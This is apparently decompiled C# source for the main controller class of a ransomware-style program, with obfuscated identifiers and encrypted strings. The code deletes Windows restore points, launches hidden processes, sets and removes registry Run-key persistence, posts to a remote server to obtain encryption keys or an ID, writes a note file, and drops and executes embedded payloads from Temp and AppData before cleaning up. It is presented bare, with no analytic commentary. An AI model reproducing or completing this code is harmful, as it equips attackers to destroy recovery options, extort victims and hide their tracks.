using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

public sealed class GClass1
{
	[StructLayout(LayoutKind.Auto)]
	private struct Struct0 : IAsyncStateMachine
	{
		public int int_0;

		public AsyncTaskMethodBuilder asyncTaskMethodBuilder_0;

		public GClass1 gclass1_0;

		private TaskAwaiter taskAwaiter_0;

		private void MoveNext()
		{
			int num = int_0;
			GClass1 gClass = gclass1_0;
			try
			{
				TaskAwaiter awaiter;
				if (num != 0)
				{
					gClass.method_1(bool_2: false);
					gClass.method_33();
					gClass.method_24();
					gClass.method_32();
					gClass.method_25();
					gClass.method_26();
					gClass.method_27();
					gClass.method_30();
					awaiter = gClass.method_14().method_14().GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						int_0 = 0;
						taskAwaiter_0 = awaiter;
						asyncTaskMethodBuilder_0.AwaitUnsafeOnCompleted(ref awaiter, ref this);
						return;
					}
				}
				else
				{
					awaiter = taskAwaiter_0;
					taskAwaiter_0 = default(TaskAwaiter);
					num = -1;
					int_0 = -1;
				}
				awaiter.GetResult();
				gClass.method_28();
				gClass.method_31();
				gClass.method_21();
				gClass.method_1(bool_2: true);
				gClass.method_33();
			}
			catch (Exception exception)
			{
				int_0 = -2;
				asyncTaskMethodBuilder_0.SetException(exception);
				return;
			}
			int_0 = -2;
			asyncTaskMethodBuilder_0.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerHidden]
		private void SetStateMachine(IAsyncStateMachine stateMachine)
		{
			asyncTaskMethodBuilder_0.SetStateMachine(stateMachine);
		}

		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
			//ILSpy generated this explicit interface implementation from .override directive in SetStateMachine
			this.SetStateMachine(stateMachine);
		}
	}

	private bool bool_0;

	private bool bool_1;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private GClass2 gclass2_0;

	public GClass1()
	{
		method_15(new GClass2(this));
		method_13(Class4.smethod_0(1550578183));
		method_11(string.Empty);
		method_9(string.Empty);
		method_5(string.Empty);
		method_3(bool_2: true);
	}

	public bool method_0()
	{
		return bool_0;
	}

	public void method_1(bool bool_2)
	{
		bool_0 = bool_2;
	}

	public bool method_2()
	{
		return bool_1;
	}

	public void method_3(bool bool_2)
	{
		bool_1 = bool_2;
	}

	public string method_4()
	{
		return string_0;
	}

	public void method_5(string string_5)
	{
		string_0 = string_5;
	}

	public string method_6()
	{
		return string_1;
	}

	public void method_7(string string_5)
	{
		string_1 = string_5;
	}

	public string method_8()
	{
		return string_2;
	}

	public void method_9(string string_5)
	{
		string_2 = string_5;
	}

	public string method_10()
	{
		return string_3;
	}

	public void method_11(string string_5)
	{
		string_3 = string_5;
	}

	public string method_12()
	{
		return string_4;
	}

	public void method_13(string string_5)
	{
		string_4 = string_5;
	}

	public GClass2 method_14()
	{
		return gclass2_0;
	}

	public void method_15(GClass2 gclass2_1)
	{
		gclass2_0 = gclass2_1;
	}

	public async Task method_16()
	{
		method_1(bool_2: false);
		method_33();
		method_24();
		method_32();
		method_25();
		method_26();
		method_27();
		method_30();
		await method_14().method_14();
		method_28();
		method_31();
		method_21();
		method_1(bool_2: true);
		method_33();
	}

	[DllImport("Srclient.dll")]
	private static extern int SRRemoveRestorePoint(int int_0);

	public void method_17()
	{
		//IL_0014: Unknown result type (might be due to invalid IL or missing references)
		//IL_001e: Expected O, but got Unknown
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementClass(Class4.smethod_0(1550578210), Class4.smethod_0(1550578235), new ObjectGetOptions()).GetInstances().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					SRRemoveRestorePoint(int.Parse(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item(Class4.smethod_0(1550578255)).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
	}

	private void method_18()
	{
		try
		{
			method_21();
			Registry.CurrentUser.OpenSubKey(Class4.smethod_0(1550578274), writable: true)!.SetValue(Class4.smethod_0(1550578326), Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	public void method_19()
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = Class4.smethod_0(1550578346),
				Arguments = Class4.smethod_0(1550578356)
			};
			process.Start();
		}
		catch
		{
		}
	}

	public void method_20()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(Class4.smethod_0(1550578415));
			if (registryKey.GetValue(Class4.smethod_0(1550578479)) == null)
			{
				registryKey.SetValue(Class4.smethod_0(1550578479), Class4.smethod_0(1550578498));
			}
			else
			{
				registryKey.DeleteValue(Class4.smethod_0(1550578479));
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern bool IsDebuggerPresent();

	private void method_21()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(Class4.smethod_0(1550578274), writable: true)!.DeleteValue(Class4.smethod_0(1550578326));
		}
		catch
		{
		}
	}

	private void method_22()
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				FileName = Class4.smethod_0(1550578346),
				Arguments = Class4.smethod_0(1550578506)
			};
			process.Start();
		}
		catch
		{
		}
	}

	public byte[] method_23(byte[] byte_0)
	{
		try
		{
			string text = byte_0.smethod_0();
			string text2 = string.Empty;
			List<string> list = new List<string>();
			string text3 = text;
			for (int i = 0; i < text3.Length; i++)
			{
				char value = text3[i];
				if (Class4.smethod_0(1550578540).Contains(value.ToString()))
				{
					list.Add(Class4.smethod_0(1550578540).IndexOf(value) + Class4.smethod_0(1550578611));
				}
				else
				{
					list.Add(int.Parse(value.ToString()) * 5 + Class4.smethod_0(1550578619));
				}
			}
			list.Reverse();
			foreach (string item in list)
			{
				text2 += item;
			}
			byte_0 = text2.smethod_2();
			return byte_0;
		}
		catch
		{
			return byte_0;
		}
	}

	public void method_24()
	{
		method_17();
		method_20();
		method_19();
		method_18();
	}

	public void method_25()
	{
		try
		{
			method_11(Class4.smethod_0(1550578626));
			method_7(method_10().Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void method_26()
	{
		try
		{
			if (method_29())
			{
				string data = Class4.smethod_0(1550578686);
				WebClient webClient = new WebClient();
				try
				{
					string text = webClient.UploadString(method_12() + Class4.smethod_0(1550577683), data);
					if (text.Contains(Class4.smethod_0(1550577709)))
					{
						Thread.Sleep(100);
						method_3(bool_2: true);
						method_26();
					}
					else
					{
						method_9(text);
					}
					return;
				}
				finally
				{
					((IDisposable)webClient).Dispose();
				}
			}
			byte[] array = new byte[10];
			RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
			try
			{
				rNGCryptoServiceProvider.GetBytes(array);
			}
			finally
			{
				((IDisposable)rNGCryptoServiceProvider).Dispose();
			}
			method_9(BitConverter.ToString(array).Replace(Class4.smethod_0(1550577721), string.Empty));
		}
		catch
		{
		}
	}

	public void method_27()
	{
		try
		{
			if (method_29())
			{
				WebClient webClient = new WebClient();
				try
				{
					string data = Class4.smethod_0(1550577729) + method_8().smethod_2().smethod_3().smethod_0() + Class4.smethod_0(1550577748);
					string text = webClient.UploadString(method_12() + Class4.smethod_0(1550577763), data);
					if (text.Contains(Class4.smethod_0(1550577709)))
					{
						Thread.Sleep(50);
						method_3(bool_2: true);
						method_27();
					}
					else
					{
						text = text.smethod_2().smethod_4().smethod_0();
						string[] array = text.Split(new char[1] { '|' });
						method_14().method_5(array[0].smethod_2().smethod_4().smethod_4()
							.smethod_4()
							.smethod_4()
							.smethod_4());
						method_14().method_7(array[1].smethod_2().smethod_4().smethod_4()
							.smethod_4()
							.smethod_4()
							.smethod_4());
					}
					return;
				}
				finally
				{
					((IDisposable)webClient).Dispose();
				}
			}
			do
			{
				method_14().method_25();
			}
			while (method_14().method_4().Length != 32 || method_14().method_6().Length != 16);
			byte[] byte_ = method_23(method_14().method_4().smethod_3());
			string text2 = string.Concat(str2: method_23(method_14().method_6().smethod_3()).smethod_3().smethod_0(), str0: byte_.smethod_3().smethod_0(), str1: Class4.smethod_0(1550577795));
			method_5(method_23(text2.smethod_2()).smethod_3().smethod_0());
		}
		catch
		{
			Thread.Sleep(100);
			method_27();
		}
	}

	public void method_28()
	{
		try
		{
			string path = Class4.smethod_0(1550577803);
			if (File.Exists(path))
			{
				File.Delete(path);
			}
			string empty = string.Empty;
			empty = ((method_4().Length <= 0) ? (Class4.smethod_0(1550577829) + method_8() + Class4.smethod_0(1550577951) + method_10().Replace(Class4.smethod_0(1550577795), Environment.NewLine) + Class4.smethod_0(1550578028)) : (Class4.smethod_0(1550577829) + method_8() + Class4.smethod_0(1550577919) + method_4() + Class4.smethod_0(1550577951) + method_10().Replace(Class4.smethod_0(1550577795), Environment.NewLine) + Class4.smethod_0(1550578028)));
			File.WriteAllText(path, empty);
		}
		catch
		{
			Thread.Sleep(100);
			method_28();
		}
	}

	public bool method_29()
	{
		try
		{
			if (!method_2())
			{
				using (WebClient webClient = new WebClient())
				{
					if (webClient.DownloadString(Class4.smethod_0(1550578043)).Length > 10)
					{
						return true;
					}
					return false;
				}
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	public void method_30()
	{
		try
		{
			string text = method_4() + Class4.smethod_0(1550578067) + method_8() + Class4.smethod_0(1550578067) + method_10();
			text = text.smethod_2().smethod_3().smethod_3()
				.smethod_0();
			string text2 = Path.GetTempPath() + Class4.smethod_0(1550578075);
			if (File.Exists(text2))
			{
				try
				{
					File.Delete(text2);
				}
				catch
				{
				}
			}
			File.WriteAllText(text2, text);
			new FileInfo(text2).Attributes = FileAttributes.Hidden;
		}
		catch
		{
		}
	}

	public void method_31()
	{
		try
		{
			byte[] bytes = Class20.smethod_3();
			string text = Path.GetTempPath() + Class4.smethod_0(1550578090);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
			try
			{
				File.WriteAllBytes(text, bytes);
				bytes = null;
				GC.Collect();
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = text
				};
				process.Start();
				new FileInfo(text).Attributes = FileAttributes.Hidden;
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	public void method_32()
	{
		try
		{
			byte[] bytes = Class20.smethod_4();
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(1550578134);
			if (File.Exists(text))
			{
				try
				{
					File.Delete(text);
				}
				catch
				{
				}
			}
			try
			{
				try
				{
					File.WriteAllBytes(text, bytes);
				}
				catch
				{
				}
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = text,
					Verb = Class4.smethod_0(1550578149)
				};
				process.Start();
				new FileInfo(text).Attributes = FileAttributes.Hidden;
				bytes = null;
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public void method_33()
	{
		try
		{
			foreach (Process item6 in Process.GetProcesses().ToList())
			{
				try
				{
					if (item6.ProcessName.ToLower().Replace(Class4.smethod_0(1550578161), string.Empty).Contains(Class4.smethod_0(1550578169)))
					{
						item6.Kill();
					}
				}
				catch
				{
				}
			}
			string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(1550578134);
			try
			{
				if (File.Exists(path))
				{
					File.Delete(path);
				}
			}
			catch
			{
			}
			string item = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + Class4.smethod_0(1550579205);
			string item2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Class4.smethod_0(1550579216);
			string item3 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class4.smethod_0(1550579228);
			string item4 = Path.GetTempPath() + Class4.smethod_0(1550579240);
			string item5 = Path.GetTempPath() + Class4.smethod_0(1550579259);
			List<string> obj3 = new List<string> { item4, item5, item3, item2, item };
			string fileName = Path.GetFileName(Assembly.GetExecutingAssembly().Location);
			foreach (string item7 in obj3)
			{
				try
				{
					File.Delete(item7 + Class4.smethod_0(1550579269) + fileName);
				}
				catch
				{
				}
				try
				{
					Directory.Delete(item7);
				}
				catch
				{
				}
			}
			if (method_0())
			{
				Application.Exit();
			}
		}
		catch
		{
		}
	}
}
